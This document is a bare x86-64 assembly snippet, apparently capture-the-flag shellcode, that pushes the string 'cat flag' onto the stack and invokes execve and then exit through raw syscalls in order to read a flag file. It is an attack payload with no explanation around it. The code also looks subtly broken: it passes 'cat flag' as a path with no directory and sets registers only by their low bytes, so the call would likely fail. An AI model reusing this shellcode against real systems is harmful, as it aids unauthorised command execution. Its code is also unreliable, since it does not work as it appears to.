section .text
global _start
_start:
    push rax
    xor rdx, rdx
    xor rsi, rsi
    mov rbx, 'cat flag'
    push rbx
    push rsp
    pop rdi
    mov al, 59
    syscall
    mov al, 60
    mov bl, 0
    syscall
